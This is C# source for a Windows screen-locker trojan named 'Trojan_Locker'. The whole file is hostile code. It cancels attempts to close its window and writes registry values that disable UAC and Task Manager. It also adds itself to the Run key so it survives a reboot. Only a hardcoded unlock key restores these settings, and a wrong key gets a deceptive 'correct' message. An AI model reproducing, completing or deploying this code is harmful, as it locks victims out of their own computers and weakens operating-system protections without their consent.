using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Media; 
using Microsoft.Win32;
using System.Diagnostics; 
using System.Runtime.InteropServices;

namespace blue
{
    public partial class troyano : Form
    {
     


        private SoundPlayer _soundplayer; //defines music
        public troyano()
        {
            InitializeComponent();
            _soundplayer = new SoundPlayer("C:\\norm9.wav"); //path for music(must be .wav)
        }

        private void blue_skull2_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true; //Anti close
        }

        private void blue_skull2_Load(object sender, EventArgs e)
        {




            timer1.Start();
            _soundplayer.Play();// Enciende la música
                                // la misma configuración de registro que en la primera sección
            RegistryKey rk = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            rk.SetValue("FilterAdministratorToken", 1, RegistryValueKind.DWord);

            RegistryKey rg = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            rg.SetValue("EnableLUA", 0, RegistryValueKind.DWord);

            RegistryKey reg = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            reg.SetValue("Trojan_Locker", Application.ExecutablePath.ToString());

            RegistryKey fk = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            fk.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);

        }



        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void button1_Click_1(object sender, EventArgs e)
        {

            // condición para el botón

            if (textBox1.Text == "") // si el usuario no completa nada
            {

                MessageBox.Show("Incorrect key", "WRONG KEY", MessageBoxButtons.OK, MessageBoxIcon.Error); //comando

            }
            else if (textBox1.Text == "hunter") // si escribe el código correcto
            {
                // comandos para configurar el registro en la configuración predeterminada y el programa se apaga al final
                // o sea aqui va la clave 
                ProcessStartInfo kokot = new ProcessStartInfo();
                kokot.FileName = "cmd.exe";
                kokot.WindowStyle = ProcessWindowStyle.Hidden;
                kokot.Arguments = @"/k start explorer.exe";
                Process.Start(kokot);

                MessageBox.Show("The key is correct", "UNLOCKED", MessageBoxButtons.OK, MessageBoxIcon.Information);
                RegistryKey rk = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                rk.SetValue("FilterAdministratorToken", 0, RegistryValueKind.DWord);

                RegistryKey key = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                key.SetValue("EnableLUA", 1, RegistryValueKind.DWord);

                RegistryKey fk = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                fk.SetValue("DisableTaskMgr", 0, RegistryValueKind.DWord);

                RegistryKey reg = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                reg.SetValue("Trojan_Locker", 0, RegistryValueKind.String);
                Process[] _proceses = null;
                _proceses = Process.GetProcessesByName("Trojan_Locker");
                foreach (Process proces in _proceses)
                {
                    proces.Kill();
                }
                this.Close();
            }
            else // si escribe el código incorrecto
            {

                button1.Text = "Decrypting... Please wait";
                MessageBox.Show("The key is correct", "UNLOCKED", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }

        }

        

        private void timer1_Tick(object sender, EventArgs e)
        {
            
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void label2_Click(object sender, EventArgs e)
        {

        }
    }
}
